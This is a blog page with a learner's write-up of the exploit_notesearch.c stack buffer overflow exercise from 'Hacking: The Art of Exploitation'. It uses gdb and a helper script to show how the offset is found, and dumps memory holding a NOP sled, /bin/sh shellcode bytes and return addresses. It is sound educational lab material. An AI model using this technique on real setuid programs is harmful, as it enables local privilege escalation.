<!DOCTYPE HTML>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  
  <title>Hacking: The Art of Exploitation - exploit_notesearch.c writeup | Hexo</title>
  <meta name="author" content="John Doe">
  
  <meta name="description" content="exploit_notesearch source code.c
What the exploit_notesearch.c does, is to allocate an area of memory pointed to by command, to build the exploit comm">
  
  
  <meta property="og:title" content="Hacking: The Art of Exploitation - exploit_notesearch.c writeup">
  <meta property="og:site_name" content="Hexo">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta property="og:image" content>
  
   <link rel="apple-touch-icon" href="/icon.png">
   <link rel="shortcut icon" href="/favicon.png">
   <link rel="alternate" href="http://xxx.xx/atom.xml" title="Hexo" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
</head>
</html>

<body>
  <div id="content" class="inner">
    <aside id="sidebar" class="alignleft">
      <div class="navigationBar">
        <a href="/">Hexo</a>
      </div>
    	
  <nav class="widget" id="menu">
	<ul>
    
      <li class="cell"><a class="next" href="/">Home</a></li><li>
    
      </li><li class="cell"><a class="next" href="/archives/">Archives</a></li><li>
    
      </li><li class="cell"><a class="next" href="/about/">About</a></li><li>
    
      </li><li class="cell"><a class="next" href="/atom.xml">Subscribe</a></li><li>
    
    </li></ul>
</nav>

  <div class="widget weibo">
<iframe width="100%" height="100" class="share_self" frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=110&fansRow=2&ptype=1&speed=0&skin=1&isTitle=1&noborder=0&isWeibo=0&isFans=0&uid=&verifier=78e1ee4d&colors=ffffff,ffffff,999,000,ecfbfd&dpc=1"></iframe>
</div>

  
<div class="widget tag">
  <h3 class="title">Categories</h3>
  <ul class="entry">
  
    <li><a href="/categories/cyber-security/binary-exploitation/">binary_exploitation</a><small>1</small></li>
  
    <li><a href="/categories/cyber-security/">cyber_security</a><small>2</small></li>
  
    <li><a href="/categories/fundementals/">fundementals</a><small>1</small></li>
  
    <li><a href="/categories/cyber-security/reverse-engineering/">reverse_engineering</a><small>1</small></li>
  
    <li><a href="/categories/cyber-security/binary-exploitation/stack-overflow/">stack_overflow</a><small>1</small></li>
  
  </ul>
</div>


  
<div class="widget tagcloud">
  <h3 class="title">Tags</h3>
  <div class="entry">
    <a href="/tags/assembly/" style="font-size: 10px;">assembly</a> <a href="/tags/binary/" style="font-size: 10px;">binary</a> <a href="/tags/binary-exploitation/" style="font-size: 15px;">binary_exploitation</a> <a href="/tags/buffer-overflow/" style="font-size: 15px;">buffer_overflow</a> <a href="/tags/c/" style="font-size: 20px;">c</a> <a href="/tags/elf/" style="font-size: 10px;">elf</a> <a href="/tags/expoit/" style="font-size: 15px;">expoit</a> <a href="/tags/hacking-the-art-of-exploitation/" style="font-size: 15px;">hacking_the_art_of_exploitation</a> <a href="/tags/hexdump/" style="font-size: 10px;">hexdump</a> <a href="/tags/reverse-engineering/" style="font-size: 15px;">reverse engineering</a>
  </div>
</div>


    	<footer id="footer" class="inner"><div class="copyright">
  
  &copy; 2019 John Doe
  
</div>



</footer>
    </aside>
    
    
    <div id="hidden-navigationBar" class="navigationBar">
      <a href="/">Hexo</a>
    </div>
    <div id="main-col" class="alignright">
    <div id="wrapper">
      
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src>
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title">Hacking: The Art of Exploitation - exploit_notesearch.c writeup</h1>
  

      <time datetime="2018-11-06T15:40:44.000Z"><a href="/2018/11/06/Hacking-The-Art-of-Exploitation-Exploit-notesearch-c-writeup/">2018-11-06</a></time>
      
  </header>
    <div class="entry">
      
        <p><a href="https://github.com/intere/hacking/blob/master/booksrc/exploit_notesearch.c" target="_blank" rel="noopener">exploit_notesearch source code.c</a></p>
<p>What the exploit_notesearch.c does, is to allocate an area of memory pointed to by <code>command</code>, to build the exploit command. A proportion of this area is pointed to by <code>buffer</code>, which stores the exploit code.</p>
<p>When looking at the code of exploit_notesearch.c, the part that confuses me the most is, </p>
<p><br></p>
<blockquote>
<p><strong>How is the offset 270 determined?</strong></p>
</blockquote>
<p><br></p>
<p>After spending enormous hours experimenting, I figured out it is based on the fact that the stack of the <code>notesearch</code> program is residing above the stack of <code>exploit_notesearch</code> program who invokes it.</p>
<p>That is why varialbe <code>i</code> is used as a reference point to reach to the exploit code exists in the <code>notesearch</code> stack.</p>
<p>To actually see this behavior ourselves, we can attach to the process of <code>notesearch</code> from gdb, to inspect the data stored in its stack. To do that, we can have a script keep polling the child process of <code>exploit_notesearch</code> program, once the <code>notesearch</code> program is spawned, the script will call gdb to attach to it, and pause its execution for us to explore the data on its stack.</p>
<p>I will call the script in question <code>gdb-att-childpid.sh</code> (thanks to <a href="https://stackoverflow.com/questions/4382348/is-there-any-way-to-tell-gdb-to-wait-for-a-process-to-start-and-attach-to-it" target="_blank" rel="noopener">this post</a>. Its content is shown below.</p>
<p>This script will be running in another terminal window. It takes the process name as its input, if our case, is <code>exploit</code>. Once it detects any child process spawned under the given process name, it will start a gdb instance to attach to the child process, and then we have a interactive gdb session to inspect the memory stack of <code>notesearch</code>.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line"></span><br><span class="line">progstr=$1</span><br><span class="line">progpid=$(pgrep $progstr)</span><br><span class="line">while [ "$progpid" == "" ]; do</span><br><span class="line">   progpid=$(pgrep $progstr)</span><br><span class="line">done</span><br><span class="line">sudo gdb -p $progpid</span><br></pre></td></tr></table></figure>
<p>First we start above script in a terminal, then we open a new terminal window to debug the <code>exploit_notesearch</code> program.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -q exploit_notesearch</span><br><span class="line">(gdb) run 210</span><br><span class="line">Starting program: /home/myuser/exploit_notesearch 210</span><br></pre></td></tr></table></figure>
<blockquote>
<p>We are setting offset to 210 rahter the default value 270 here, and this might be different in your lab. This value is determined by using the technique (for…seq) illustrated on page 141 of the Hacking: The Art of Exploitation book.</p>
</blockquote>
<p>Meanwhile, we notice gdb has automatically attached to the <code>notesearch</code> process in another winodow, and we are given the gdb window to debug from there,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">warning: not using untrusted file &quot;/home/myuser/.gdbinit&quot;</span><br><span class="line">Attaching to process 21537</span><br><span class="line">Reading symbols from /home/myuser/exploit_notesearch/notesearch...done.</span><br><span class="line">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;.</span><br><span class="line">Reading symbols from /lib/tls/i686/cmov/libc.so.6...done.</span><br><span class="line">Loaded symbols for /lib/tls/i686/cmov/libc.so.6</span><br><span class="line">Reading symbols from /lib/ld-linux.so.2...done.</span><br><span class="line">Loaded symbols for /lib/ld-linux.so.2</span><br><span class="line">0xffffe410 in __kernel_vsyscall ()</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
<p>First, let’s see where we are right now,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) where</span><br><span class="line">#0  0xffffe410 in __kernel_vsyscall ()</span><br><span class="line">#1  0xb7f29e40 in nanosleep () from /lib/tls/i686/cmov/libc.so.6</span><br><span class="line">#2  0xb7f29c8f in sleep () from /lib/tls/i686/cmov/libc.so.6</span><br><span class="line">#3  0x0804883b in main (argc=2, argv=0xbffff834) at notesearch.c:20</span><br></pre></td></tr></table></figure>
<p>The <code>where</code> command shows the backtrace of all the stacks. <code>#0</code> being the current(innvermost) stack, the stack right beneath it is its parent. The output above actually ressembles the order the stack for each function is built in memory - the latest/innermost stack being on the lowest memory address space (on the top of its parent).</p>
<p>Since we need to inspect the data in <code>notesearch</code>‘s stack, we can use command <code>frame 3</code> to get there.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) frame 3</span><br><span class="line">#3  0x08048792 in main (argc=2, argv=0xbffff7c4) at notesearch.c:16</span><br><span class="line">16         sleep(1);</span><br></pre></td></tr></table></figure>
<p>We can see the execution is currently paused at line 16 of notesearch.c. This is before the exploit code is put into the <code>searchstring</code> variable. Now let’s contiune the execution to pass the initialization  of the <code>searchstring</code> variable.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) until 26</span><br><span class="line">main (argc=-1073744190, argv=0xbffff6c2) at notesearch.c:26</span><br></pre></td></tr></table></figure>
<p>The <code>until</code> command tells the execution to proceed until it reaches line 26 in the notesearch source file.</p>
<p>Now let’s inspect the data stored in <code>searchstring</code>,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/32xw &amp;searchstring</span><br><span class="line">0xbffff6b0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xbffff6c0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xbffff6d0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xbffff6e0:     0x90909090      0x90909090      0x90909090      0xdb31c031</span><br><span class="line">0xbffff6f0:     0xb099c931      0x6a80cda4      0x6851580b      0x68732f2f</span><br><span class="line">0xbffff700:     0x69622f68      0x51e3896e      0x8953e289      0xbf80cde1</span><br><span class="line">0xbffff710:     0xbffff6c2      0xbffff6c2      0xbffff6c2      0xbffff6c2</span><br><span class="line">0xbffff720:     0xbffff6c2      0xbffff6c2      0xbffff6c2      0xbffff6c2</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
<p>Hurray! The data stored here is exact what we expected, and the return address <code>0xbffff6c2</code> calculated just now sits right in the mid of NOP instructions, which makes the exploitation evetually happen.</p>

	 
	     <p style="margin:20px 0; color:#9f9f9f; font-size:12px;">
<span>Posted by <a style="color:#9f9f9f;" href><strong></strong></a> - 2018-11-06</span><br>
<span style="line-height:13px;">如需转载，请注明： 本文来自 <a style="color:#9f9f9f;" href="https://blog.bbf.ninja"><strong>Hexo</strong></a></span>
</p>
       	 
      
    </div>
    <footer>
      
	 
     		  
  
  <div class="categories">
    <a href="/categories/cyber-security/">cyber_security</a>, <a href="/categories/cyber-security/binary-exploitation/">binary_exploitation</a>, <a href="/categories/cyber-security/binary-exploitation/stack-overflow/">stack_overflow</a>
  </div>

       		
  
  <div class="tags">
    <a href="/tags/binary-exploitation/">binary_exploitation</a>, <a href="/tags/hacking-the-art-of-exploitation/">hacking_the_art_of_exploitation</a>, <a href="/tags/c/">c</a>, <a href="/tags/expoit/">expoit</a>, <a href="/tags/buffer-overflow/">buffer_overflow</a>
  </div>

     		  
       	 
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>


</div>
    </div>
    <div class="tabbar" onload="divideTabBar()">
	
      <div class="tabbaritem"><a class="next" href="/">Home</a></div>
    
      <div class="tabbaritem"><a class="next" href="/archives/">Archives</a></div>
    
      <div class="tabbaritem"><a class="next" href="/about/">About</a></div>
    
      <div class="tabbaritem"><a class="next" href="/atom.xml">Subscribe</a></div>
    
</div>


  </div>
</body>
</html>